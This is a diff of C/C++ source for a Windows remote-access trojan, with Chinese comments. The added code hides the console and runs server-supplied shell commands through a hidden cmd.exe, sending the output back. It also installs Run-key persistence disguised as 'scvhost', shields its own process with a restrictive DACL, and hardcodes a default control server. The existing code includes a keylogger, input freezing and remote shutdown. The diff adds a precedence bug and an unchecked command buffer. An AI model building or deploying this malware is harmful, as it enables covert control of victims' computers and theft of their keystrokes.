@@ -1,28 +1,82 @@
 #include"common.h"
-//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
+#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
+#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR")
 #define MSG_LEN 1024
 #define MSG_LENN 5120
+
 
 char* ServerIp;
 int ServerPort;
 
+
+//执行命令
+int cmd(char *cmdStr, char *message)
+{
+	DWORD readByte = 0;
+	char command[1024] = { 0 };
+	char buf[MSG_LENN] = { 0 }; //缓冲区
+
+	HANDLE hRead, hWrite;
+	STARTUPINFO si;         // 启动配置信息
+	PROCESS_INFORMATION pi; // 进程信息
+	SECURITY_ATTRIBUTES sa; // 管道安全属性
+
+							// 配置管道安全属性
+	sa.nLength = sizeof(sa);
+	sa.bInheritHandle = TRUE;
+	sa.lpSecurityDescriptor = NULL;
+
+	// 创建匿名管道，管道句柄是可被继承的
+	if (!CreatePipe(&hRead, &hWrite, &sa, MSG_LENN)) {
+		return 1;
+	}
+
+	// 配置 cmd 启动信息
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si); // 获取兼容大小
+	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // 标准输出等使用额外的
+	si.wShowWindow = SW_HIDE;               // 隐藏窗口启动
+	si.hStdOutput = si.hStdError = hWrite;  // 输出流和错误流指向管道写的一头
+
+											// 拼接 cmd 命令
+	sprintf(command, "cmd.exe /c %s", cmdStr);
+
+	// 创建子进程,运行命令,子进程是可继承的
+	if (!CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+		CloseHandle(hRead);
+		CloseHandle(hWrite);
+		//printf("error!");
+		return 1;
+	}
+	CloseHandle(hWrite);
+
+	//读取管道的read端,获得cmd输出
+	while (ReadFile(hRead, buf, MSG_LENN, &readByte, NULL)) {
+		strcat(message, buf);
+		ZeroMemory(buf, MSG_LENN);
+	}
+	CloseHandle(hRead);
+
+	return 0;
+}
+
+
 void c_socket()
 {
-	puts("m-1");
+
 	// 初始化 Winsock
 	WSADATA wsaData;
-	//struct hostent *host;
-	//struct in_addr addr;
+
 
 	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != NO_ERROR) {
 	}
 
+
 	// 建立socket socket.
 	SOCKET client;
 	client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (client == INVALID_SOCKET) {
-		printf("Error at socket(): %d\n", WSAGetLastError());
 		WSACleanup();
 		return;
 	}
@@ -39,28 +93,24 @@ void c_socket()
 	GetUserName(userName, &nameLen);
 	GetComputerName(comName, &comLen);
 	snprintf(comInfo, sizeof(comInfo), "%s@%s", comName, userName);
-	//sprintf(comInfo, "%s@%s", comName, userName);
+
 
 	// 连接到服务器.
 	sockaddr_in clientService;
 	clientService.sin_family = AF_INET;
 	clientService.sin_addr.S_un.S_addr = inet_addr(ServerIp);
 	clientService.sin_port = htons(ServerPort);
-	puts("m2");
 	while (1) {
 		if (connect(client, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
-			puts("m3");
 			Sleep(20000);
 			continue;
 		}
 		else {
-			puts("m4");
 			send(client, comInfo, strlen(comInfo), 0);
 			break;
 		}
 	}
 
-	puts("m1");
 	//阻塞等待服务端指令
 	char recvCmd[MSG_LEN] = { 0 };
 	char message[MSG_LENN + 10] = { 0 };
@@ -75,7 +125,6 @@ void c_socket()
 			while (1) {
 				client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 				if (connect(client, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
-					//printf( "\nFailed to connect.\nWait 10s...\n" );
 					Sleep(20000);
 					continue;
 				}
@@ -87,11 +136,11 @@ void c_socket()
 			continue;
 		}
 		else if (strcmp(recvCmd, "shutdown") == 0) {  //关机
-			system("shutdown -s -t 1");
+			system("shutdown -s -t 20");
 			continue;
 		}
 		else if (strcmp(recvCmd, "reboot") == 0) {  //重启
-			system("shutdown -r -t 10");
+			system("shutdown -r -t 20");
 			continue;
 		}
 		else if (strcmp(recvCmd, "cancel") == 0) {  //取消关机
@@ -111,15 +160,16 @@ void c_socket()
 		}
 		else if (strcmp(recvCmd, "blockinput") == 0) { //冻结鼠标和键盘
 			BlockInput(true);
-			Sleep(5000);
+			continue;
+		}
+		else if (strcmp(recvCmd, "input") == 0) { //释放鼠标和键盘
 			BlockInput(false);
 			continue;
 		}
 		else if (strcmp(recvCmd, "keylogger") == 0)//键盘记录
 		{
 			char keylog[MAX_PATH];
-			GetCurrentDirectoryA(MAX_PATH,keylog);
-			//getcwd(keylog, MAX_PATH);//direct.h not support in mingw
+			GetCurrentDirectoryA(MAX_PATH, keylog);
 			string keylogs = keylog;
 			string FileName = keylogs + "\\log.txt";
 			string KeyName = "";
@@ -130,7 +180,7 @@ void c_socket()
 				Sleep(5);
 				for (int i = 8; i <= 255; i++)
 				{
-					if ((GetAsyncKeyState(i) & 1) == 1)               //判断虚拟按键是否按下，无论是一直按着还是按一下就弹起，只判断是否按过
+					if (GetAsyncKeyState(i) & 1 == 1)               //判断虚拟按键是否按下，无论是一直按着还是按一下就弹起，只判断是否按过
 					{
 						KeyName = GetKeyName(i);
 						FileStream.write(KeyName.c_str(), KeyName.size());
@@ -147,6 +197,17 @@ void c_socket()
 		else if (strcmp(recvCmd, "upload") == 0) { //下载文件
 			continue;
 		}
+		else if ((recvCmd[0] == '$')) {
+			int i;
+			char c;
+			char CMD[30] = { 0 };
+			for (i = 1; (c = recvCmd[i]) != '\0'; i++) {
+				CMD[i - 1] = recvCmd[i];
+			}
+			if (!cmd(CMD, message)) send(client, message, strlen(message), 0);
+			else send(client, "CMD Error!\n", 12, 0);
+			continue;
+		}
 		else {
 			continue;
 		}
@@ -155,11 +216,12 @@ void c_socket()
 	return;
 }
 
+
+//键盘记录
 string GetKeyName(int NumKey)
 {
 	bool IS_SHIFT = JudgeShift();
 	string revalue = "";
-	puts("m2");
 	//判断键盘中间的特殊符号
 	if (NumKey >= 186 && NumKey <= 222)
 		switch (NumKey)
@@ -414,6 +476,7 @@ string GetKeyName(int NumKey)
 	return revalue;
 }
 
+
 bool JudgeShift()
 {
 	int iShift = GetKeyState(0x10); //判断Shift键状态
@@ -425,42 +488,38 @@ bool JudgeShift()
 }
 
 
+//Ring3保护
 BOOL Ring3ProtectProcess()
 {
-	HANDLE 		hProcess;
+	HANDLE hProcess = ::GetCurrentProcess();
 	SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;
-	PSID 		pSid;
-	BOOL 		bSus = FALSE;
-	HANDLE 		hToken;
-	DWORD 		dwReturnLength;
-	LPVOID 		TokenInformation;
-	PTOKEN_USER 	pTokenUser;
-	BYTE 		Buf[0x200];
-	PACL 		pAcl;
-DWORD dw;
-
-	hProcess = ::GetCurrentProcess();
-	bSus = ::AllocateAndInitializeSid(&sia, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);
-	if (!bSus) goto cleanup;
+	PSID pSid;
+	BOOL bSus = FALSE;
+	bSus = ::AllocateAndInitializeSid(&sia, 1, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, &pSid);
+	if (!bSus) goto Cleanup;
+	HANDLE hToken;
 	bSus = ::OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
-	if (!bSus) goto cleanup;
-	::GetTokenInformation(hToken, TokenUser, NULL, 0, &dwReturnLength);
-	if (dwReturnLength > 0x400) goto cleanup;
+	if (!bSus) goto Cleanup;
+	DWORD dwReturnLength;
+	::GetTokenInformation(hToken, TokenUser, NULL, NULL, &dwReturnLength);
+	if (dwReturnLength > 0x400) goto Cleanup;
+	LPVOID TokenInformation;
 	TokenInformation = ::LocalAlloc(LPTR, 0x400);//这里就引用SDK的函数不引用CRT的了  
+	DWORD dw;
 	bSus = ::GetTokenInformation(hToken, TokenUser, TokenInformation, 0x400, &dw);
-	if (!bSus) goto cleanup;
-	pTokenUser = (PTOKEN_USER)TokenInformation;
-	pAcl = (PACL)&Buf;
+	if (!bSus) goto Cleanup;
+	PTOKEN_USER pTokenUser = (PTOKEN_USER)TokenInformation;
+	BYTE Buf[0x200];
+	PACL pAcl = (PACL)&Buf;
 	bSus = ::InitializeAcl(pAcl, 1024, ACL_REVISION);
-	if (!bSus) goto cleanup;
+	if (!bSus) goto Cleanup;
 	bSus = ::AddAccessDeniedAce(pAcl, ACL_REVISION, 0xFFFFFFFF, pSid);
-	if (!bSus) goto cleanup;
+	if (!bSus) goto Cleanup;
 	bSus = ::AddAccessAllowedAce(pAcl, ACL_REVISION, 0x00100701, pTokenUser->User.Sid);
-	if (!bSus) goto cleanup;
+	if (!bSus) goto Cleanup;
 	if (::SetSecurityInfo(hProcess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, NULL, NULL, pAcl, NULL) == 0)
 		bSus = TRUE;
-
-cleanup:
+Cleanup:
 	if (hProcess != NULL)
 		::CloseHandle(hProcess);
 	if (pSid != NULL)
@@ -469,12 +528,45 @@ cleanup:
 }
 
 
+//自动运行
+int autoRun()
+{
+	//写入注册表,开机自启动
+	HKEY hKey;
+	//找到系统的启动项
+	LPCTSTR lpRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+	//打开启动项Key
+	long lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
+	if (lRet == ERROR_SUCCESS)
+	{
+		char pFileName[MAX_PATH] = { 0 };
+		//得到程序自身的全路径
+		DWORD dwRet = GetModuleFileName(NULL, pFileName, MAX_PATH);
+		//添加一个子键,并设置值
+		lRet = RegSetValueEx(hKey, "scvhost", 0, REG_SZ, (BYTE *)pFileName, dwRet);
+
+		//关闭注册表
+		RegCloseKey(hKey);
+	}
+
+	return 0;
+}
+
+
 int main(int argc, char** argv)
 {
-	//Ring3ProtectProcess();
-	ServerIp = argv[1];
-	ServerPort = atoi(argv[2]);
-	//starting();
+	autoRun();
+	Ring3ProtectProcess();
+	if (argc >= 2)
+	{
+		ServerIp = argv[1];
+		ServerPort = atoi(argv[2]);
+	}
+	else
+	{
+		ServerIp = "10.10.1.115";
+		ServerPort = 8083;
+	}
 	c_socket();
 	return 0;
 }
